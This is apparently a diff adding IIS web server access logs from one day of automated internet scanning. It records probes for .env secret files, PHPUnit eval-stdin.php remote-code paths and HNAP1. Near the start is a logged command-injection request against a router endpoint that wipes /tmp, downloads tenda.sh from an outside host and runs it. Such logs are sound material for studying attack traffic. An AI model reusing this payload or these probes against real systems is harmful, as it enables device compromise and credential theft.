@@ -64,3 +64,421 @@
 2024-01-24 11:38:58 172.31.36.65 POST / - 80 - 135.125.246.110 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 119
 2024-01-24 11:55:06 172.31.36.65 GET /.env - 80 - 135.125.246.110 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 111
 2024-01-24 11:55:06 172.31.36.65 POST / - 80 - 135.125.246.110 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 120
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 12:20:45
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 12:20:42 172.31.36.65 GET / - 80 - 5.179.80.205 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36 - 304 0 0 1296
+2024-01-24 12:20:42 172.31.36.65 GET /iisstart.png - 80 - 5.179.80.205 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36 http://3.22.63.57/ 200 0 0 378
+2024-01-24 12:21:40 172.31.36.65 GET /.env - 80 - 78.153.140.224 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 150
+2024-01-24 12:24:39 172.31.36.65 GET / - 80 - 148.63.207.231 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 - 200 0 0 118
+2024-01-24 12:24:39 172.31.36.65 GET /ncsi.txt - 80 - 148.63.207.231 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 http://3.22.63.57/ 404 0 2 118
+2024-01-24 12:24:39 172.31.36.65 GET / - 443 - 148.63.207.231 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 - 200 0 0 119
+2024-01-24 12:24:39 172.31.36.65 GET /HNAP1/ - 80 - 148.63.207.231 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 http://3.22.63.57/ 404 0 2 118
+2024-01-24 12:24:41 172.31.36.65 GET /HNAP1/ - 443 - 148.63.207.231 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 https://3.22.63.57/ 404 0 2 119
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 12:54:20
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 12:54:17 172.31.36.65 GET /cgi-bin/luci/;stok=/locale form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh) 80 - 185.224.128.191 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36 - 404 0 2 1183
+2024-01-24 12:54:17 172.31.36.65 GET /cgi-bin/luci/;stok=/locale form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh) 80 - 185.224.128.191 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36 - 404 0 64 88
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 13:50:23
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 13:50:20 172.31.36.65 GET /favicon.ico - 80 - 171.120.30.115 Mozilla/5.0+(Windows+NT+6.1)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.112+Safari/537.36 - 404 0 2 368
+2024-01-24 13:50:22 172.31.36.65 GET / - 80 - 182.242.168.52 Mozilla/5.0+(Windows+NT+6.1)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.112+Safari/537.36 - 200 0 0 4616
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 14:26:31
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 14:26:28 172.31.36.65 GET /.env - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1210
+2024-01-24 14:26:28 172.31.36.65 POST / - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 106
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 15:07:39
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 15:07:36 172.31.36.65 GET /.env - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1194
+2024-01-24 15:07:36 172.31.36.65 POST / - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 104
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 16:06:00
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 16:05:57 172.31.36.65 GET /.env - 443 - 141.95.74.78 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1199
+2024-01-24 16:05:57 172.31.36.65 POST / - 443 - 141.95.74.78 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 105
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 17:09:46
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 17:09:43 172.31.36.65 GET /.env - 443 - 141.95.74.78 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1211
+2024-01-24 17:09:43 172.31.36.65 POST / - 443 - 141.95.74.78 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 107
+2024-01-24 17:23:41 172.31.36.65 GET /.env - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 104
+2024-01-24 17:23:41 172.31.36.65 POST / - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 105
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 17:45:28
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 17:45:25 172.31.36.65 GET /.env - 80 - 185.254.196.173 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1233
+2024-01-24 17:45:25 172.31.36.65 POST / - 80 - 185.254.196.173 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 134
+2024-01-24 18:05:31 172.31.36.65 GET / - 80 - 103.203.57.7 HTTP+Banner+Detection+(https://security.ipip.net) - 200 0 0 10
+2024-01-24 18:21:22 172.31.36.65 GET /autodiscover/autodiscover.json @zdi/Powershell 443 - 192.241.208.18 Mozilla/5.0+zgrab/0.x - 404 0 2 67
+2024-01-24 18:25:03 172.31.36.65 GET /.env - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 107
+2024-01-24 18:25:03 172.31.36.65 POST / - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 103
+2024-01-24 18:30:18 172.31.36.65 GET / - 443 - 185.180.143.137 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.113+Safari/537.36 - 200 0 0 131
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 19:00:27
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 19:00:24 172.31.36.65 GET / - 80 - 66.245.193.100 python-requests/2.31.0 - 200 0 0 1193
+2024-01-24 19:07:05 172.31.36.65 GET /.env - 80 - 185.254.196.173 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 133
+2024-01-24 19:07:05 172.31.36.65 POST / - 80 - 185.254.196.173 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 131
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 19:34:06
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 19:34:03 172.31.36.65 GET /.env - 443 - 141.95.74.78 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1208
+2024-01-24 19:34:03 172.31.36.65 POST / - 443 - 141.95.74.78 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 104
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 20:03:54
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 20:03:51 172.31.36.65 GET /.env - 443 - 78.153.140.177 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1230
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 20:41:12
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 20:41:09 172.31.36.65 GET /.env - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1203
+2024-01-24 20:41:09 172.31.36.65 POST / - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 105
+2024-01-24 20:42:51 172.31.36.65 GET / - 80 - 205.210.31.21 Expanse,+a+Palo+Alto+Networks+company,+searches+across+the+global+IPv4+space+multiple+times+per+day+to+identify+customers&#39;+presences+on+the+Internet.+If+you+would+like+to+be+excluded+from+our+scans,+please+send+IP+addresses/domains+to:+scaninfo@paloaltonetworks.com - 200 0 0 38
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 21:05:47
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 21:05:44 172.31.36.65 GET / - 80 - 173.239.211.52 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 200 0 0 1113
+2024-01-24 21:05:44 172.31.36.65 GET / - 443 - 173.239.211.45 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 200 0 0 1069
+2024-01-24 21:05:53 172.31.36.65 POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 443 - 63.135.161.112 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 56
+2024-01-24 21:05:53 172.31.36.65 POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 173.239.211.43 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 17
+2024-01-24 21:05:53 172.31.36.65 POST /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php+/vendor/phpunit/src/Util/PHP/eval-stdin.php - 443 - 173.239.211.54 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 17
+2024-01-24 21:05:53 172.31.36.65 POST /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php+/vendor/phpunit/src/Util/PHP/eval-stdin.php - 80 - 45.130.83.239 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 17
+2024-01-24 21:05:53 172.31.36.65 POST /vendor/phpunit/Util/PHP/eval-stdin.php+/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 443 - 173.239.211.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 61
+2024-01-24 21:05:54 172.31.36.65 POST /vendor/phpunit/Util/PHP/eval-stdin.php+/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 173.239.211.37 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:54 172.31.36.65 POST /phpunit/phpunit/Util/PHP/eval-stdin.php+/phpunit/src/Util/PHP/eval-stdin.php - 443 - 173.239.211.35 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 18
+2024-01-24 21:05:54 172.31.36.65 POST /phpunit/phpunit/Util/PHP/eval-stdin.php+/phpunit/src/Util/PHP/eval-stdin.php - 80 - 45.130.83.248 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 17
+2024-01-24 21:05:54 172.31.36.65 POST /phpunit/Util/PHP/eval-stdin.php+/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 173.239.211.40 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:54 172.31.36.65 POST /lib/phpunit/phpunit/Util/PHP/eval-stdin.php+/lib/phpunit/src/Util/PHP/eval-stdin.php - 80 - 45.130.83.250 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 17
+2024-01-24 21:05:54 172.31.36.65 POST /lib/phpunit/Util/PHP/eval-stdin.php - 80 - 173.239.211.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:55 172.31.36.65 POST /admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php - 80 - 63.135.161.117 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 17
+2024-01-24 21:05:55 172.31.36.65 POST /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 45.130.83.250 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:55 172.31.36.65 POST /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 63.135.161.117 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 17
+2024-01-24 21:05:55 172.31.36.65 POST /phpunit/Util/PHP/eval-stdin.php+/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 443 - 63.135.161.116 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 40
+2024-01-24 21:05:55 172.31.36.65 POST /api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php - 80 - 63.135.161.121 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 17
+2024-01-24 21:05:55 172.31.36.65 POST /lib/phpunit/phpunit/Util/PHP/eval-stdin.php+/lib/phpunit/src/Util/PHP/eval-stdin.php - 443 - 63.135.161.122 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 59
+2024-01-24 21:05:56 172.31.36.65 POST /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 173.239.211.52 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:56 172.31.36.65 POST /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 45.130.83.239 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 17
+2024-01-24 21:05:56 172.31.36.65 POST /lib/phpunit/Util/PHP/eval-stdin.php - 443 - 45.130.83.244 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 15
+2024-01-24 21:05:56 172.31.36.65 POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 63.135.161.110 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 15
+2024-01-24 21:05:56 172.31.36.65 POST /admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php - 443 - 173.239.211.35 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:56 172.31.36.65 POST /laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 45.130.83.250 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:56 172.31.36.65 POST /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 173.239.211.52 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:57 172.31.36.65 POST /lib/phpunit/phpunit/Util/PHP/eval-stdin.php - 80 - 173.239.211.48 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 15
+2024-01-24 21:05:57 172.31.36.65 POST /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 443 - 45.130.83.241 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:57 172.31.36.65 POST /lib/phpunit/src/Util/PHP/eval-stdin.php - 80 - 191.101.41.158 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:57 172.31.36.65 POST /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 63.135.161.116 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:57 172.31.36.65 POST /libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 63.135.161.118 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 18
+2024-01-24 21:05:57 172.31.36.65 POST /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 443 - 63.135.161.129 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:58 172.31.36.65 GET / - 80 - 45.130.83.240 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 200 0 0 15
+2024-01-24 21:05:58 172.31.36.65 GET /.DS_Store - 80 - 63.135.161.123 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:05:58 172.31.36.65 POST /api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php - 443 - 173.239.211.45 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 40
+2024-01-24 21:05:58 172.31.36.65 GET /.env - 80 - 173.239.211.40 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:05:58 172.31.36.65 POST /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 443 - 173.239.211.51 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/93.0.4577.82+Safari/537.36 - 404 0 2 35
+2024-01-24 21:05:58 172.31.36.65 POST /.env - 80 - 63.135.161.113 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.0+Safari/605.1.15 - 404 0 2 16
+2024-01-24 21:05:59 172.31.36.65 GET / - 443 - 173.239.211.46 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 200 0 0 16
+2024-01-24 21:05:59 172.31.36.65 GET /.DS_Store - 443 - 173.239.211.38 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36 - 404 0 2 63
+2024-01-24 21:05:59 172.31.36.65 GET /.env - 443 - 63.135.161.119 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:05:59 172.31.36.65 GET /.env.save - 80 - 173.239.211.42 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 15
+2024-01-24 21:06:01 172.31.36.65 POST /.env.save - 80 - 173.239.211.38 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:01 172.31.36.65 POST /.env - 443 - 191.101.41.157 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:01 172.31.36.65 GET /.env.old - 80 - 63.135.161.118 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:01 172.31.36.65 POST /.env.old - 80 - 63.135.161.118 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 17
+2024-01-24 21:06:01 172.31.36.65 GET /.env.save - 443 - 173.239.211.35 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.0+Safari/605.1.15 - 404 0 2 16
+2024-01-24 21:06:01 172.31.36.65 GET /.env.prod - 80 - 173.239.211.37 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:02 172.31.36.65 POST /.env.save - 443 - 173.239.211.50 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:02 172.31.36.65 POST /.env.prod - 80 - 173.239.211.46 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:02 172.31.36.65 GET /.env.old - 443 - 45.130.83.245 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:03 172.31.36.65 POST /.env.old - 443 - 173.239.211.52 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
